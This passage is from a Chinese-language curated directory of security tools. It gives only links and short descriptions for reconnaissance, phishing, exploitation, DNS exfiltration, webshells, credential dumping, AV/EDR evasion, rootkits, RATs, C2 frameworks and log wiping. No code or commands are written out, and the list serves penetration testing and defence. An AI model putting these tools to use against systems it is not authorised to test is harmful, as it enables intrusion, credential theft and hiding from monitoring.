        -   [gshark](https://github.com/neal1991/gshark)

        -   [GitGot](https://github.com/BishopFox/GitGot)

        -   [gitGraber](https://github.com/hisxo/gitGraber) monitor GitHub to search and find sensitive data in real time for different online services

    9.  ### 路径及文件扫描

        -   [weakfilescan](https://github.com/ring04h/weakfilescan)

        -   [DirBrute](https://github.com/Xyntax/DirBrute)

        -   [dirsearch](https://github.com/maurosoria/dirsearch)

        -   [bfac](https://github.com/mazen160/bfac)

        -   [ds_store_exp](https://github.com/lijiejie/ds_store_exp)

    10. ### 路径爬虫

        -   [crawlergo](https://github.com/0Kee-Team/crawlergo) A powerful dynamic crawler for web vulnerability scanners

    11. ### 指纹识别

        -   [Wappalyzer](https://github.com/AliasIO/Wappalyzer)

        -   [whatweb](https://github.com/urbanadventurer/whatweb)

        -   [Wordpress Finger Print](https://github.com/iniqua/plecost)

        -   [CMS 指纹识别](https://github.com/n4xh4ck5/CMSsc4n)

        -   [JA3](https://github.com/salesforce/ja3) is a standard for creating SSL client fingerprints in an easy to produce and shareable way

        -   [TideFinger](https://github.com/TideSec/TideFinger)

        -   [JARM](https://github.com/salesforce/jarm) active Transport Layer Security (TLS) server fingerprinting tool

        -   [fingerprintjs](https://github.com/fingerprintjs/fingerprintjs) Browser fingerprinting library with the highest accuracy and stability

    12. ### Waf 指纹

        -   [identywaf](https://github.com/enablesecurity/identywaf)

        -   [wafw00f](https://github.com/enablesecurity/wafw00f)

        -   [WhatWaf](https://github.com/Ekultek/WhatWaf)

    13. ### 端口扫描

        -   [nmap](https://github.com/nmap/nmap)

        -   [zmap](https://github.com/zmap/zmap)

        -   [masscan](https://github.com/robertdavidgraham/masscan)

        -   [ShodanHat](https://github.com/HatBashBR/ShodanHat)

        -   [lzr](https://github.com/stanford-esrg/lzr) LZR quickly detects and fingerprints unexpected services running on unexpected ports

        -   [ZGrab2](https://github.com/zmap/zgrab2) Fast Go Application Scanner

        -   [RustScan](https://github.com/RustScan/RustScan) The Modern Port Scanner

        -   DNS dnsenum nslookup dig fierce

        -   SNMP snmpwalk

    14. ### DNS 数据查询

        -   [VirusTotal](https://www.virustotal.com/)

        -   [PassiveTotal](https://passivetotal.org/)

        -   [DNSDB](https://www.dnsdb.info/)

        -   [sitedossier](http://www.sitedossier.com/)

    15. ### DNS 关联

        -   [Cloudflare Enumeration Tool](https://github.com/mandatoryprogrammer/cloudflare_enum)

        -   [amass](https://github.com/caffix/amass)

        -   [Certificate Search](https://crt.sh/)

    16. ### 云服务

        -   [Find aws s3 buckets](https://github.com/gwen001/s3-buckets-finder)

        -   [CloudScraper](https://github.com/jordanpotti/CloudScraper)

        -   [AWS Bucket Dump](https://github.com/jordanpotti/AWSBucketDump)

    17. ### 数据查询

        -   [Censys](https://censys.io/)

        -   [Shodan](https://www.shodan.io/)

        -   [Zoomeye](https://www.zoomeye.org/)

        -   [fofa](https://fofa.so/)

        -   [scans](https://scans.io/)

        -   [Just Metadata](https://github.com/FortyNorthSecurity/Just-Metadata)

        -   publicwww - Find Web Pages via Snippet

    18. ### Password

        -   [Probable Wordlists](https://github.com/berzerk0/Probable-Wordlists) Wordlists sorted by probability originally created for password generation and testing

        -   [Common User Passwords Profiler](https://github.com/Mebus/cupp)

        -   [chrome password grabber](https://github.com/x899/chrome_password_grabber)

        -   [DefaultCreds cheat sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) One place for all the default credentials to assist the pentesters during an engagement

        -   [SuperWordlist](https://github.com/fuzz-security/SuperWordlist)

    19. ### CI 信息泄露

        -   [secretz](https://github.com/lc/secretz) minimizing the large attack surface of Travis CI

    20. ### 个人数据画像

        -   [GHunt](https://github.com/mxrch/GHunt) Investigate Google Accounts with emails

    21. ### 邮箱收集

        -   [EmailHarvester](https://github.com/maldevel/EmailHarvester)

    22. ### 其他

        -   [datasploit](https://github.com/DataSploit/datasploit)

        -   [watchdog](https://github.com/flipkart-incubator/watchdog)

        -   [archive](https://archive.org/web/)

        -   [HTTPLeaks](https://github.com/cure53/HTTPLeaks)

        -   [htrace](https://github.com/trimstray/htrace.sh)

        -   [Quake Command-Line Application](https://github.com/360quake/quake_rs) 360 网络空间测绘系统

4.  ## 社会工程学

    1.  ### OSINT

        -   [osint](http://osintframework.com/)

        -   [osint git](https://github.com/lockfale/OSINT-Framework)

        -   [OSINT-Collection](https://github.com/Ph055a/OSINTCollection)

        -   [trape](https://github.com/jofpin/trape)

        -   [Photon](https://github.com/s0md3v/Photon)

        -   [pockint](https://github.com/netevert/pockint)

    2.  ### 社交工具

        -   [SlackPirate](https://github.com/emtunc/SlackPirate) Slack Enumeration and Extraction Tool - extract sensitive information from a Slack Workspace

        -   [twint](https://github.com/twintproject/twint) An advanced Twitter scraping & OSINT tool

    3.  ### 个人搜索

        -   [pipl](https://pipl.com/)

        -   [hunter](https://hunter.io/)

        -   [EagleEye](https://github.com/ThoughtfulDev/EagleEye)

        -   [LinkedInt](https://github.com/mdsecactivebreach/LinkedInt)

        -   [sherlock](https://github.com/sherlock-project/sherlock)

        -   [email enum](https://github.com/Frint0/email-enum)

        -   [Sreg](https://github.com/n0tr00t/Sreg)

        -   [usersearch](https://usersearch.org/)

        -   [User Searcher](https://www.user-searcher.com/) User-Searcher is a powerful and free tool to help you search username in 2000+ websites.

    4.  ### Hacking database

        -   [GHDB](https://www.exploit-db.com/google-hacking-database/)

        -   [have i been pwned](https://github.com/kernelmachine/haveibeenpwned)

    5.  ### 钓鱼

        -   [spoofcheck](https://github.com/BishopFox/spoofcheck)

        -   [gophish](https://github.com/gophish/gophish)

        -   [SocialFish](https://github.com/UndeadSec/SocialFish)

        -   [HFish](https://github.com/hacklcx/HFish) A Most Convenient Honeypot Platform

        -   [blackeye](https://github.com/thelinuxchoice/blackeye) complete Phishing Tool, with 32 templates +1 customizable

        -   [king phisher](https://github.com/rsmusllp/king-phisher/) Phishing Campaign Toolkit

        -   [espoofer](https://github.com/chenjj/espoofer) An email spoofing testing tool that aims to bypass SPF/DKIM/DMARC and forge DKIM signatures

        -   [ditto](https://github.com/evilsocket/ditto) A tool for IDN homograph attacks and detection

        -   [SiteCopy](https://github.com/Threezh1/SiteCopy) sitecopy is a tool that facilitates personal website backup and network data collection

        -   [goblin](https://github.com/xiecat/goblin) 一款适用于红蓝对抗中的仿真钓鱼系统

    6.  ### squatting

        -   [dnstwist](https://github.com/elceef/dnstwist) Domain name permutation engine for detecting homograph phishing attacks, typo squatting, and brand impersonation

    7.  ### 网盘搜索

        -   [虫部落](http://magnet.chongbuluo.com/)

        -   [盘多多](http://www.panduoduo.net/)

        -   [Infinite Panc](https://www.panc.cc/)

    8.  ### 密码猜测

        -   [OMEN](https://github.com/RUB-SysSec/OMEN) Ordered Markov ENumerator - Password Guesser

        -   [genpAss](https://github.com/RicterZ/genpAss)

    9.  ### 伪造

        -   [email_hack](https://github.com/Macr0phag3/email_hack) 基于 Python 伪造电子邮件发件人

    10. ### 综合框架

        -   [theHarvester](https://github.com/laramies/theHarvester)

        -   [Th3inspector](https://github.com/Moham3dRiahi/Th3inspector)

        -   [ReconDog](https://github.com/s0md3v/ReconDog)

5.  ## 模糊测试

    1.  ### Web Fuzz

        -   [wfuzz](https://github.com/xmendez/wfuzz)

        -   [SecLists](https://github.com/danielmiessler/SecLists)

        -   [fuzzdb](https://github.com/fuzzdb-project/fuzzdb)

        -   [foospidy payloads](https://github.com/foospidy/payloads)

        -   [ffuf](https://github.com/ffuf/ffuf) Fast web fuzzer written in Go

    2.  ### 扫描器

        -   [Nuclei](https://github.com/projectdiscovery/nuclei) a fast tool for configurable targeted vulnerability scanning based on templates offering massive extensibility and ease of use

        -   [xray](https://github.com/chaitin/xray) 安全评估工具，支持常见 web 安全问题扫描和自定义 poc

    3.  ### XSS Payloads

        -   [PORTSWIGGER XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

        -   [Pgaijin66 XSS-Payloads](https://github.com/Pgaijin66/XSS-Payloads)

        -   [OWASP XSS](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

    4.  ### Burp 插件

        -   [BurpBounty](https://github.com/wagiro/BurpBounty) Scan Check Builder

        -   [BurpShiroPassiveScan](https://github.com/pmiaowu/BurpShiroPassiveScan)

        -   [IntruderPayloads](https://github.com/1N3/IntruderPayloads) A collection of Burpsuite Intruder payloads

    5.  ### 字典

        -   [Blasting dictionary](https://github.com/rootphantomer/Blasting_dictionary)

        -   [pydictor](https://github.com/LandGrey/pydictor) A powerful and useful hacker dictionary builder for a brute-force attack

        -   [fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts) Web Pentesting Fuzz 字典

        -   [bruteforce lists](https://github.com/random-robbie/bruteforce-lists)

        -   [CT subdomains](https://github.com/internetwache/CT_subdomains)

        -   [PentesterSpecialDict](https://github.com/ppbibo/PentesterSpecialDict) 渗透测试人员专用精简化字典

    6.  ### Unicode Fuzz

        -   [utf16encode](http://www.fileformat.info/info/charset/UTF-16/list.htm)

    7.  ### WAF Bypass

        -   [abuse ssl bypass waf](https://github.com/LandGrey/abuse-ssl-bypass-waf)

        -   [wafninja](https://github.com/khalilbijjou/wafninja)

6.  ## 漏洞利用/检测

    1.  ### 数据库注入

        -   [SQLMap](https://github.com/sqlmapproject/sqlmap)

        -   [bbqsql](https://github.com/Neohapsis/bbqsql)

        -   [MSDAT](https://github.com/quentinhardy/msdat) Microsoft SQL Database Attacking Tool

    2.  ### 非结构化数据库注入

        -   [NoSQLAttack](https://github.com/youngyangyang04/NoSQLAttack)

        -   [NoSQLMap](https://github.com/codingo/NoSQLMap)

        -   [Nosql Exploitation Framework](https://github.com/torque59/Nosql-Exploitation-Framework)

        -   [MongoDB audit](https://github.com/stampery/mongoaudit)

    3.  ### 数据库漏洞利用

        -   [mysql unsha1](https://github.com/cyrus-and/mysql-unsha1)

        -   [ODAT](https://github.com/quentinhardy/odat) Oracle Database Attacking Tool

    4.  ### XSS

        -   [BeEF](https://github.com/beefproject/beef)

        -   [XSS Reciver](https://github.com/firesunCN/BlueLotus_XSSReceiver)

        -   [DSXS](https://github.com/stamparm/DSXS)

        -   [XSStrike](https://github.com/s0md3v/XSStrike)

        -   [xsssniper](https://github.com/gbrindisi/xsssniper)

        -   [tracy](https://github.com/nccgroup/tracy)

        -   [xsleaks](https://github.com/xsleaks/xsleaks) A collection of browser-based side channel attack vectors

    5.  ### SSRF

        -   [SSRFmap](https://github.com/swisskyrepo/SSRFmap)

        -   [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

        -   [Gopherus](https://github.com/tarunkant/Gopherus)

        -   [SSRF Testing](https://github.com/cujanovic/SSRF-Testing)

    6.  ### 模版注入

        -   [tplmap](https://github.com/epinna/tplmap)

    7.  ### HTTP Request Smuggling

        -   [smuggler](https://github.com/defparam/smuggler) An HTTP Request Smuggling / Desync testing tool written in Python

        -   [h2cSmuggler](https://github.com/BishopFox/h2csmuggler) HTTP Request Smuggling over HTTP/2 Cleartext (h2c)

    8.  ### 命令注入

        -   [commix](https://github.com/commixproject/commix)

    9.  ### PHP

        -   [Chankro](https://github.com/TarlogicSecurity/Chankro) Herramienta para evadir disable_functions y open_basedir

    10. ### LFI

        -   [LFISuite](https://github.com/D35m0nd142/LFISuite)

        -   [FDsploit](https://github.com/chrispetrou/FDsploit)

    11. ### struts

        -   [struts scan](https://github.com/Lucifer1993/struts-scan)

    12. ### CMS

        -   [Joomla Vulnerability Scanner](https://github.com/rezasp/joomscan)

        -   [Drupal enumeration & exploitation tool](https://github.com/immunIT/drupwn)

        -   [Wordpress Vulnerability Scanner](https://github.com/UltimateLabs/Zoom)

        -   [TPscan](https://github.com/Lucifer1993/TPscan) 一键 ThinkPHP 漏洞检测

        -   [dedecmscan](https://github.com/lengjibo/dedecmscan) 织梦全版本漏洞扫描

    13. ### Java 框架

        -   [ShiroScan](https://github.com/sv3nbeast/ShiroScan) Shiro\<=1.2.4 反序列化检测工具

        -   [fastjson rce tool](https://github.com/wyzxxz/fastjson_rce_tool) fastjson 命令执行利用工具

    14. ### DNS 相关漏洞

        -   [dnsAutoRebinding](https://github.com/Tr3jer/dnsAutoRebinding)

        -   [AngelSword](https://github.com/Lucifer1993/AngelSword)

        -   [Subdomain TakeOver](https://github.com/m4ll0k/takeover)

        -   [mpDNS](https://github.com/nopernik/mpDNS)

        -   [JudasDNS Nameserver DNS poisoning](https://github.com/mandatoryprogrammer/JudasDNS)

        -   [singularity](https://github.com/nccgroup/singularity) A DNS rebinding attack framework by NGC Group

    15. ### DNS 数据提取

        -   [dnsteal](https://github.com/m57/dnsteal)

        -   [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator)

        -   [dns exfiltration by krmaxwell](https://github.com/krmaxwell/dns-exfiltration)

        -   [dns exfiltration by coryschwartz](https://github.com/coryschwartz/dns_exfiltration)

        -   [requestbin for dns](http://requestbin.net/dns)

    16. ### DNS 隧道

        -   [dnstunnel de](https://dnstunnel.de/)

        -   [iodine](https://code.kryo.se/iodine/)

    17. ### DNS Shell

        -   [chashell](https://github.com/sysdream/chashell)

        -   [dnscat2](https://github.com/iagox86/dnscat2)

    18. ### XXE

        -   [XXEinjector](https://github.com/enjoiz/XXEinjector)

        -   [XXER](https://github.com/TheTwitchy/xxer)

        -   [DTD Finder](https://github.com/GoSecure/dtd-finder) List DTDs and generate XXE payloads using those local DTDs

    19. ### 反序列化

#### Java 反序列化

-   [ysoserial](https://github.com/frohoff/ysoserial)

-   [JRE8u20 RCE Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)

-   [Java Serialization Dumper](https://github.com/NickstaDB/SerializationDumper) A tool to dump Java serialization streams in a more human readable form

-   [marshalsec](https://github.com/mbechler/marshalsec) Java Unmarshaller Security - Turning your data into code execution

-   [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector) A byte code analyzer for finding deserialization gadget chains in Java applications

-   [fastjsonScan](https://github.com/zilong3033/fastjsonScan) fastjson 漏洞 burp 插件

#### .NET 反序列化

-   [viewgen](https://github.com/0xacb/viewgen) ASP.NET ViewState Generator

20. ### JNDI

    -   [Rogue JNDI](https://github.com/veracode-research/rogue-jndi) A malicious LDAP server for JNDI injection attacks

    -   [JNDI Injection Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)

    -   [JNDIExploit](https://github.com/feihong-cs/JNDIExploit)

21. ### 端口 Hack

    -   [nmap vulners](https://github.com/vulnersCom/nmap-vulners)

    -   [nmap nse scripts](https://github.com/cldrn/nmap-nse-scripts)

    -   [Vulnerability Scanning with Nmap](https://github.com/scipag/vulscan)

22. ### JWT

    -   [jwtcrack](https://github.com/brendan-rius/c-jwt-cracker)

23. ### 无线

    -   [infernal twin](https://github.com/entropy1337/infernal-twin)

24. ### 中间人攻击

[TABLE]

> HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.

-   [toxy](https://github.com/h2non/toxy) Hackable HTTP proxy for resiliency testing and simulated network conditions

-   [bettercap](https://github.com/bettercap/bettercap) The Swiss Army knife for 802.11, BLE and Ethernet networks reconnaissance and MITM attacks

1.  ### DHCP

    -   [DHCPwn](https://github.com/mschwager/dhcpwn)

2.  ### DDoS

    -   [Saddam](https://github.com/OffensivePython/Saddam)

3.  ### 正则表达式

    -   [Regexploit](https://github.com/doyensec/regexploit) Find regular expressions which are vulnerable to ReDoS

4.  ### Shellcode

    -   [go shellcode](https://github.com/Ne0nd0g/go-shellcode) A repository of Windows Shellcode runners and supporting utilities

5.  ### 越权

    -   [secscan authcheck](https://github.com/ztosec/secscan-authcheck)

6.  ### 利用平台

    -   [DNSLog](https://github.com/BugScanTeam/DNSLog) 是一款监控 DNS 解析记录和 HTTP 访问记录的工具

    -   [LuWu](https://github.com/QAX-A-Team/LuWu) 红队基础设施自动化部署工具

7.  ### 漏洞利用库

    -   [Penetration Testing POC](https://github.com/Mr-xn/Penetration_Testing_POC)

    -   [thc ipv6](https://github.com/vanhauser-thc/thc-ipv6) IPv6 attack toolkit

8.  ### 漏洞利用框架

    -   [pocsuite3](https://github.com/knownsec/pocsuite3)

9.  ### Windows

    -   [PyWSUS](https://github.com/GoSecure/pywsus) a standalone implementation of a legitimate WSUS server which sends malicious responses to clients

&nbsp;

1.  ## 近源渗透

    1.  ### Bad USB

        -   [WiFiDuck](https://github.com/spacehuhn/WiFiDuck) Keystroke injection attack plattform

        -   [BadUSB code](https://github.com/Xyntax/BadUSB-code) badusb 的一些利用方式及代码

        -   [WHID](https://github.com/whid-injector/WHID) WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids

        -   [BadUSB cable](https://github.com/joelsernamoreno/BadUSB-Cable) based on Attiny85 microcontroller

        -   [USB Rubber Ducky](https://github.com/hak5darren/USB-Rubber-Ducky)

    2.  ### wifi

        -   [wifiphisher](https://github.com/wifiphisher/wifiphisher)

        -   [evilginx](https://github.com/kgretzky/evilginx)

        -   [mana](https://github.com/sensepost/mana)

        -   [pwnagotchi](https://github.com/evilsocket/pwnagotchi)

    3.  ### 无线

        -   [hackrf](https://github.com/mossmann/hackrf) low cost software radio platform

2.  ## Web 持久化

    1.  ### WebShell 管理工具

        -   [菜刀](https://github.com/Chora10/Cknife)

        -   [antSword](https://github.com/antoor/antSword)

        -   [冰蝎](https://github.com/rebeyond/Behinder) 动态二进制加密网站管理客户端

        -   [weevely3](https://github.com/epinna/weevely3) Weaponized web shell

        -   [Altman](https://github.com/keepwn/Altman) the cross platform webshell tool in .NET

        -   [Webshell Sniper](https://github.com/WangYihang/Webshell-Sniper) Manage your website via terminal

        -   [quasibot](https://github.com/Smaash/quasibot) complex webshell manager, quasi-http botnet

    2.  ### WebShell

        -   [webshell](https://github.com/tennc/webshell)

        -   [PHP backdoors](https://github.com/bartblaze/PHP-backdoors)

        -   [php bash - semi-interactive web shell](https://github.com/Arrexel/phpbash)

        -   [Python RSA Encrypted Shell](https://github.com/Eitenne/TopHat.git)

        -   [b374k - PHP WebShell Custom Tool](https://github.com/b374k/b374k)

        -   [JSP Webshells](https://github.com/threedr3am/JSP-Webshells)

        -   [MemShellDemo](https://github.com/jweny/MemShellDemo)

    3.  ### Web 后门

        -   [pwnginx](https://github.com/t57root/pwnginx)

        -   [Apache backdoor](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor)

        -   [SharpGen](https://github.com/cobbr/SharpGen) .NET Core console application that utilizes the Rosyln C# compiler to quickly cross-compile

> .NET Framework console applications or libraries

-   [IIS-Raid](https://github.com/0x09AL/IIS-Raid) A native backdoor module for Microsoft IIS

3.  ## 横向移动

    1.  ### 域

        -   [impacket](https://github.com/SecureAuthCorp/impacket) is a collection of Python classes for working with network protocols

        -   [adidnsdump](https://github.com/dirkjanm/adidnsdump) Active Directory Integrated DNS dump tool

        -   [BloodHound](https://github.com/BloodHoundAD/BloodHound) Six Degrees of Domain Admin

        -   [PlumHound](https://github.com/PlumHound/PlumHound) Bloodhound for Blue and Purple Teams

        -   [windapsearch](https://github.com/ropnop/windapsearch) Python script to enumerate users, groups and computers from a Windows domain through LDAP queries

        -   [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) Active Directory information dumper via LDAP

        -   [Kerberoast](https://github.com/nidem/kerberoast) a series of tools for attacking MS Kerberos implementations

        -   [ADRecon](https://github.com/sense-of-security/ADRecon) Active Directory Recon

        -   [Creds](https://github.com/S3cur3Th1sSh1t/Creds) Some usefull Scripts and Executables for Pentest & Forensics

        -   [Lithnet Password Protection for Active Directory](https://github.com/lithnet/ad-password-protection) Active Directory password filter featuring breached password checking and custom complexity rules

        -   [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) Project that retrieves crackable hashes from KRB5 AS-REP responses for users without kerberoast preauthentication enabled.

    2.  ### LDAP

        -   [SharpHound3](https://github.com/BloodHoundAD/SharpHound3) Data Collector for the BloodHound Project

    3.  ### 微软系产品利用

        -   [LyncSniper](https://github.com/mdsecresearch/LyncSniper) A tool for penetration testing Skype for Business and Lync deployments

        -   [MSOLSpray](https://github.com/dafthack/MSOLSpray) A password spraying tool for Microsoft Online accounts (Azure/O365)

        -   [MailSniper](https://github.com/dafthack/MailSniper) MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms

    4.  ### Azure AD

        -   [ROADtools](https://github.com/dirkjanm/ROADtools) Azure AD exploration framework

    5.  ### Exchange

        -   [ruler](https://github.com/sensepost/ruler) A tool to abuse Exchange services

        -   [MailSniper](https://github.com/dafthack/MailSniper)

        -   [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

    6.  ### PowerShell

        -   [PowerShellMafia](https://github.com/PowerShellMafia)

    7.  ### 内网信息收集

        -   [nbtscan](https://github.com/scallywag/nbtscan) NetBIOS scanning tool

        -   [SharpShares](https://github.com/djhohnstein/SharpShares) Quick and dirty binary to list network share information from all machines in the current domain and if they're readable

        -   [WinShareEnum](https://github.com/nccgroup/WinShareEnum) Windows Share Enumerator

        -   [HackBrowserData](https://github.com/moonD4rk/HackBrowserData) 全平台的浏览器数据导出工具

    8.  ### Kerberos

        -   [Rubeus](https://github.com/GhostPack/Rubeus)

        -   [kerbrute](https://github.com/ropnop/kerbrute) A tool to perform Kerberos pre-auth bruteforcing

        -   [kerberoast](https://github.com/nidem/kerberoast) A series of tools for attacking MS Kerberos implementations

    9.  ### 自动化审计

        -   [Infection Monkey](https://github.com/guardicore/monkey) Data center Security Testing Tool

    10. ### 绕过

        -   [SysWhispers](https://github.com/jthuraisamy/SysWhispers) AV/EDR evasion via direct system calls

        -   [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) AV/EDR evasion via direct system calls

        -   [Dumpert](https://github.com/outflanknl/Dumpert) LSASS memory dumper using direct system calls and API unhooking

    11. ### 内网扫描

        -   [InScan](https://github.com/inbug-team/InScan) 边界打点后的自动化渗透工具

        -   [fscan](https://github.com/shadow1ng/fscan) 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。

4.  ## 云安全 {#云安全-1}

    1.  ### 云环境自动测试

#### k8s

-   [checkov](https://github.com/bridgecrewio/checkov) Prevent cloud misconfigurations during build-time for Terraform, Cloudformation, Kubernetes, Serverless framework and other infrastructure-as-code-languages with Checkov by Bridgecrew

-   [CDK](https://github.com/cdk-team/CDK) Zero Dependency Container Penetration Toolkit

-   [kube bench](https://github.com/aquasecurity/kube-bench)

-   [kube hunter](https://github.com/aquasecurity/kube-hunter) Hunt for security weaknesses in Kubernetes clusters

-   [KubiScan](https://github.com/cyberark/KubiScan) A tool to scan Kubernetes cluster for risky permissions

-   [kubescape](https://github.com/armosec/kubescape) kubescape is the first tool for testing if Kubernetes is deployed securely as defined in Ku- bernetes Hardening Guidance by to NSA and CISA

-   [kubeaudit](https://github.com/Shopify/kubeaudit) kubeaudit helps you audit your Kubernetes clusters against common security controls

-   [peirates](https://github.com/inguardians/peirates) Kubernetes Penetration Testing tool

-   [datree](https://github.com/datreeio/datree) Prevent Kubernetes misconfigurations from reaching production

#### 容器

-   [botb](https://github.com/brompwnie/botb) A container analysis and exploitation tool for pentesters and engineers

2.  ### 安全加固

    -   [falco](https://github.com/falcosecurity/falco) Cloud Native Runtime Security

3.  ### 云上扫描

    -   [Cloud Custodian](https://github.com/cloud-custodian/cloud-custodian) Rules engine for cloud security, cost optimization, and governance, DSL in yaml for policies to query, filter, and take actions on resources

    -   [cloudquery](https://github.com/cloudquery/cloudquery) cloudquery transforms your cloud infrastructure into SQL database for easy monitoring, governance and security

4.  ### 靶场环境

    -   [metarget](https://github.com/Metarget/metarget) a framework providing automatic constructions of vulnerable infrastructures.

&nbsp;

5.  ## 操作系统持久化

    1.  ### Windows

#### 凭证获取

-   [mimikatz](https://github.com/gentilkiwi/mimikatz)

-   [RdpThief](https://github.com/0x09AL/RdpThief) Extracting Clear Text Passwords from mstsc.exe using API Hooking

-   [quarkspwdump](https://github.com/quarkslab/quarkspwdump) Dump various types of Windows credentials without injecting in any process

-   [SharpDump](https://github.com/GhostPack/SharpDump) C# port of PowerSploit's Out-Minidump.ps1 functionality

#### 权限提升

-   [WindowsExploits](https://github.com/abatchy17/WindowsExploits)

-   [GTFOBins](https://github.com/GTFOBins/GTFOBins.github.io) Curated list of Unix binaries that can be exploited to bypass system security restrictions

-   [JAWS](https://github.com/411Hall/JAWS) Just Another Windows (Enum) Script

#### UAC Bypass

-   [WinPwnage](https://github.com/rootm0s/WinPwnage) UAC bypass, Elevate, Persistence and Execution methods

-   [UACME](https://github.com/hfiref0x/UACME) Defeating Windows User Account Control

-   [UAC Bypass In The Wild](https://github.com/sailay1996/UAC_Bypass_In_The_Wild)

#### 免杀

-   [SigThief](https://github.com/secretsquirrel/SigThief) Stealing Signatures and Making One Invalid Signature at a Time

#### C2

-   [SharpSploit](https://github.com/cobbr/SharpSploit) .NET post-exploitation library written in C#

-   [SharpBeacon](https://github.com/mai1zhi2/SharpBeacon) 用.net 重写了 CobaltStrike stager 及 Beacon，其中包括正常上线、文件管理、进程管理、令牌管理、结合 SysCall 进行注入、原生端口转发、关 ETW 等一系列功能

-   [Koadic](https://github.com/zerosum0x0/koadic) is a Windows post-exploitation rootkit

#### 隐藏

-   [ProcessHider](https://github.com/M00nRise/ProcessHider) Post-exploitation tool for hiding processes from monitoring applications

-   [Invoke Phant0m](https://github.com/hlldz/Invoke-Phant0m) Windows Event Log Killer

-   [EventCleaner](https://github.com/QAX-A-Team/EventCleaner) A tool mainly to erase specified records from Windows event logs, with additional func- tionalities

#### DLL 注入

-   [sRDI](https://github.com/monoxgas/sRDI) Shellcode Reflective DLL Injection

#### rootkit

-   [r77-rootkit](https://github.com/bytecode77/r77-rootkit) Ring 3 rootkit with single file installer and fileless persistence that hides processes, files, network connections, etc

#### 伪造

-   [parent PID spoofing](https://github.com/countercept/ppid-spoofing) Scripts for performing and detecting parent PID spoofing

-   [GetSystem](https://github.com/py7hagoras/GetSystem) This is a C# implementation of making a process/executable run as NT AUTHOR- ITY/SYSTEM. This is achieved through parent ID spoofing of almost any SYSTEM process.

#### MiTM

-   [Seth](https://github.com/SySS-Research/Seth) Perform a MitM attack and extract clear text credentials from RDP connections

-   [pyrdp](https://github.com/GoSecure/pyrdp) RDP man-in-the-middle (mitm) and library for Python with the ability to watch connections live or after the fact

#### 综合工具

-   [Nishang](https://github.com/samratashok/nishang) Offensive PowerShell for red team, penetration testing and offensive security

### Linux

#### 权限提升

-   [linux exploit suggester](https://github.com/mzet-/linux-exploit-suggester)

-   [LinEnum](https://github.com/rebootuser/LinEnum) Scripted Local Linux Enumeration & Privilege Escalation Checks

-   [AutoLocalPrivilegeEscalation](https://github.com/ngalongc/AutoLocalPrivilegeEscalation)

-   [traitor](https://github.com/liamg/traitor) Automatic Linux privesc via exploitation of low-hanging fruit e.g. gtfobins, pwnkit, dirty pipe,

> +w docker.sock

#### rootkit

-   [rootkit](https://github.com/nurupo/rootkit)

-   [Diamorphine](https://github.com/m0nad/Diamorphine) LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x (x86/x86_64 and ARM64)

#### 后门

-   [prism](https://github.com/andreafabrizi/prism) is an user space stealth reverse shell backdoor

-   [icmpsh](https://github.com/inquisb/icmpsh) Simple reverse ICMP shell

### 综合

#### 凭证获取

-   [sshLooterC](https://github.com/mthbernardes/sshLooterC) program to steal passwords from ssh

-   [keychaindump](https://github.com/juuso/keychaindump) A proof-of-concept tool for reading OS X keychain passwords

-   [LaZagne](https://github.com/AlessandroZ/LaZagne) Credentials recovery project

-   [SecretScanner](https://github.com/deepfence/SecretScanner) Find secrets and passwords in container images and file systems

#### 权限提升

-   [BeRoot](https://github.com/AlessandroZ/BeRoot) Privilege Escalation Project - Windows / Linux / Mac

#### RAT

-   [QuasarRAT](https://github.com/quasar/QuasarRAT)

#### C2

-   [Empire](https://github.com/EmpireProject/Empire)

-   [pupy](https://github.com/n1nj4sec/pupy)

-   [Covenant](https://github.com/cobbr/Covenant) is a collaborative .NET C2 framework for red teamers

-   [Cooolis-ms](https://github.com/Rvn0xsy/Cooolis-ms) 包含了 Metasploit Payload Loader、Cobalt Strike External C2 Loader、Reflective DLL injection 的代码执行工具

#### DNS Shell

-   [DNS Shell](https://github.com/sensepost/DNS-Shell) DNS-Shell is an interactive Shell over DNS channel

-   [Reverse DNS Shell](https://github.com/ahhh/Reverse_DNS_Shell) A python reverse shell that uses DNS as the c2 channel

#### Cobalt Strike

-   [Cobalt Strike](https://www.cobaltstrike.com/)

-   [CrossC2](https://github.com/gloxec/CrossC2) generate CobaltStrike's cross-platform payload

-   [Cobalt Strike Aggressor Scripts](https://github.com/timwhitez/Cobalt-Strike-Aggressor-Scripts)

#### 日志清除

-   [Log killer](https://github.com/Rizer0/Log-killer) Clear all logs in \[linux/windows\] servers

#### Botnet

-   [byob](https://github.com/malwaredllc/byob) Build Your Own Botnet

#### 免杀工具

-   [AV Evasion Tool](https://github.com/1y0n/AV_Evasion_Tool) 掩日 - 免杀执行器生成工具

-   [DKMC](https://github.com/Mr-Un1k0d3r/DKMC) Dont kill my cat - Malicious payload evasion tool

6.  ## 审计工具

    1.  ### 通用

        -   [Cobra](https://github.com/FeeiCN/cobra)

        -   [Semmle QL](https://github.com/Semmle/ql)

        -   [Sourcetrail](https://github.com/CoatiSoftware/Sourcetrail) free and open-source cross-platform source explorer

        -   [trivy](https://github.com/knqyf263/trivy) A Simple and Comprehensive Vulnerability Scanner for Containers, Suitable for CI

        -   [fortify](http://www.fortify.net/)

        -   [joern](https://github.com/joernio/joern) Open-source code analysis platform for C/C++/Java/Binary/Javascript based on code property graphs

    2.  ### PHP

        -   [RIPS](http://rips-scanner.sourceforge.net/)

